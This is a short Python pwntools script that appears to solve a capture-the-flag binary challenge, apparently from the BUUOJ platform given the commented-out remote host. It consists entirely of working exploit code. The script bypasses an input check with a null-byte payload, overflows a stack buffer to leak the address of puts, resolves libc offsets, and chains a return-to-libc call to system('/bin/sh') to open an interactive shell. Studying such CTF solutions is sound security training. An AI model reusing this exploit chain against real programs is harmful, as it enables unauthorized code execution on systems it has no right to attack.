# coding:utf-8
from pwn import *
from LibcSearcher import *
context.log_level = 'debug'
# sh = remote("node3.buuoj.cn",27095)
sh = process("./pwn")
elf = ELF("./pwn")
put_plt = elf.plt['puts']
put_got = elf.got['puts']
main_addr = 0x8048825
payload1 = '\x00' + 'a'*6 + '\xff'
sh.sendline(payload1)
sh.recvuntil("Correct\n")
payload2 = 'a'*0xeb+p32(put_plt)+p32(main_addr)+p32(put_got)
sh.sendline(payload2)
put_addr = u32(sh.recv(4))
libc=LibcSearcher('puts',put_addr)
log.info("success get put_got:0x%x"%put_addr) 
libc_base = put_addr - libc.dump('puts')
system_addr = libc_base + libc.dump('system')
bin_sh = libc_base + libc.dump('str_bin_sh')
sh.sendline(payload1)
sh.recvuntil("Correct\n")
gdb.attach(sh)
payload2='a'*0xeb+p32(system_addr)+p32(main_addr)+p32(bin_sh)
sh.sendline(payload2)
sh.interactive()